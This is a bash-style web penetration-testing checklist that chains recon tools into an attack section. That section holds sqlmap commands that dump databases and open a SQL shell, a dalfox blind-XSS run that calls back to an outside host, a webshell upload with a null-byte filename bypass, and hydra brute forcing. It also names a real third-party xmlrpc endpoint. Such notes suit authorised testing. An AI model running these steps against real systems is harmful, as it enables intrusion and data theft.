#!/bin/bash

#####################################################################
# Scan
#
# Input: 
#    1- targets         main web application to be hacked
#
# targets ----> whatweb     ------->  wpscan/joomscan  ----> searchsploit
#               robots.txt  ------->  hidden dirs
#               sitemap.xml ------->  hidden dirs
#               index.html  ------->  sourcing
#               js          ------->  sourcing
#               gobuster    ------->  hidden dirs
#               nikto       ------->  vulnerability
#               nuclei      ------->  vulnerability
#               burp        ------->  req/res 
#               xssscan     ------->  ptential xss
#               sqlmap      ------->  ptential sqli
#####################################################################

# ----------------------------------
#   ~/Operations/<company>/<domain>
# ----------------------------------
init ()
{    
    export SECLISTS_DIR=/var/lib/snapd/snap/seclists/37
    export WORDLIST_DIR=~/wordlist
}

# ----------------------------------
#   ~/Operations/<company>/<domain>       
# ----------------------------------

# scan.sh basic <domain>
basic ()
{
    export TARGET=www.example.com

    # Domain Validation
    dig $TARGET > dig
    dig +short $TARGET > dig.short
    dig +short ns $TARGET > dig.short.ns
    dig +trace $TARGET > dig.trace

    # Sitemap
    curl -I https://$TARGET > response.headers
    https://securityheaders.com/?q=&followRedirects=on          # missing.headers
    wget https://$TARGET/robots.txt
    wget https://$TARGET/sitemap.xml

    # Tech 
    whatweb -v -a 3 https://$TARGET --log-verbose=whatweb --color=never   
    wappalyzer_varonis-com          # export from wappalyzer 
    wafw00f $TARGET > waf
    https://www.nmmapper.com/sys/reconnaissance-tools/waf/web-application-firewall-detector/   # WAF Detection
    
    # Auto Scan
    nuclei -u https://$TARGET  -nc -o nuclei
    nikto -h https://$TARGET -o nikto.output -Format txt
    nmap $TARGET

    # Wordpress Auto Scan
    wpscan --url https://$TARGET --wp-content-dir -e --output wpscan.token --format cli-no-color --api-token $WP_TOKEN
    POST https://press.priceline.com/xmlrpc.php
    
    
    # Directory    
    gobuster dir -u https://$TARGET  -w $WORDLIST_DIR/common.txt > dirs
    curl -sS -D - https://$TARGET -o /dev/null
    ffuf -u https://$TARGET/FUZZ -w $WORDLIST_DIR/fuzz-lfi-params-list.txt -fc 30  # -fs 1-20 -s

    # URL
    katana -u https://$TARGET -fs=fqdn | tee -a urls
    paramspider -d $TARGET

    # URL, wayback machin
    waybackurls www.example.com | tee -a urls.wayback
    cat urls.wayback | sort -u > urls.wayback.su
    cat urls.wayback.su | grep -E "^http.?://www\.example\.com" > urls.wayback.su.inscope
    cat urls.wayback.su.inscope >> urls

    # Live URL
    httpx -l urls -nc -o urls.live

    # JS URL
    cat urls | subjs | tee -a jss~
    cat jss~ | sort -u > jss && rm jss~

    # Screenshot
    gowitness file --file urls
    for I in $(ls); do 
        echo "$I" >> index.html;
        echo "<br/>" >> index.html;
        echo "<img src=$I><br>" >> index.html;
        echo "<hr/>" >> index.html;
    done

    # Poke
    cat urls | fff -d 1 -S -o fff
    
    # OSINT
    zoomeye             # https://www.zoomeye.org/
    censys              # https://censys.com/
    shodan              # https://www.shodan.io/
    google dorking      # https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06
    reverse ip          # https://hackertarget.com/reverse-ip-lookup/
}


# ------------------------
# Analyze urld to find out clue
# ------------------------
url ()
{
    # URLs
    gf [awskey | base64 | json-sec | idor] 
   
    # Subdomain Takover
    subzy run --target urls

    # Broken Link Hijacking, BLH  
    socialhunter -f urls
}


# ------------------------
# Known Bugs
# ------------------------
Bug (){

    # SCAN
    ZAP Active Scan
    Burpsuite  - Scope: .*\.domain\.com$
    
    # SQLi
    cheat-sheet    
        - https://portswigger.net/web-security/sql-injection/cheat-sheet
    salmap -u "https://$TARGET/..."  
        --data "username=a&password=b" 
        --cookie "TrackingId=xx; session=xx" 
        --level 3 
        --dbs 
        --dump 
        -D <database>
        --sql-query = "select * from users"
        --sql-shell
            sql-shell> current_database();

    # XSS    
    cheat-sheet    
        - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
    Manual
        - Reflected XSS
        - Stored XSS, AKA second-order or persistent XSS
        - DOM-based XSS
    dalfox 
        -b hahwul.xss.ht 
        url https://$TARGET/...
        file urls 
        -o dalfox
    
    # Local storage
    sqlmap --cookie "TrackingId=xxx; session=xxx" --level 3

    # CSRF
    # Clickjacking
    # DOM-based vulnerabilities
    # CORS
    # XXE
    # SSRF
    # HTTP request smuggling
    # OS command injection
    # Server-side template injection
    # Path traversal
    # Access control vulnerabilities
    
    # IDOR
    cat urls | grep -E "\?.+\="
    cat urls | grep -E "[0-9]"
        - Look into request url to find out IDOR.
        - https://insecure-website.com/customer_account?customer_number=132355
        - https://insecure-website.com/static/12144.txt
        - https://insecure-website.com/somepage?invoice=12345
        - https://insecure-website.com/changepassword?user=someuser
        - https://insecure-website.com/showImage?img=img00011
        - https://insecure-website.com/accessPage?menuitem=12
    
    # Authentication
        hydra

    # WebSockets
    # Web cache poisoning
    # Insecure deserialization
    # Information disclosure
    # Business logic vulnerabilities
    # HTTP Host header attacks
    # OAuth authentication

    # File upload vulnerabilities
    webshell.php
        - filename="exploit.php%00.jpg"

    # JWT
    JWT Editor in Burp
    python jwt_tool.py <JWT>
    
    # Prototype pollution
    # GraphQL API vulnerabilities
    # Race conditions
    # NoSQL injection
  
}

logic (){
    # Business logic vulnerabilities
}



"$@"
